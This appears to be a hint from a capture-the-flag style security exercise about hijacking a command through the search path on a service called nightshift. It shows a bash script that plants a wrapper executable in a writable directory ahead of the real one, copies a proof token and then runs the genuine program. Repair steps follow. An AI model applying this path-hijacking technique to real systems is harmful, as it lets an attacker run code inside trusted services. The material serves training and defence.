# 2 / Hint 3 — Demonstrate with the exercise token only

During investigation, auditor can place a matching executable earlier in the search path. This copies only the exercise token and returns to legitimate processing:

```bash
cat > /srv/nightshift/vendor/bin/render-receipt <<'PROOF'
#!/bin/bash
set -euo pipefail
cat /srv/nightshift/service/proof-token > /srv/nightshift/evidence/path.txt
exec /srv/nightshift/app/bin/render-receipt "$@"
PROOF
chmod 0755 /srv/nightshift/vendor/bin/render-receipt
```

After the next batch run, ask the organizer to `submit`. `"$@"` forwards the arguments unchanged. The absolute path calls the legitimate renderer instead of recursively calling this replacement.

As operator during repair, keep only trusted command locations in PATH and inspect leftovers:

```bash
printf 'export PATH=/srv/nightshift/app/bin:/usr/bin:/bin\n' > /srv/nightshift/app/config/runtime.env
chmod 0755 /srv/nightshift/vendor/bin
rm -f /srv/nightshift/vendor/bin/render-receipt
```

If these settings return after a restart, continue with mission 3.
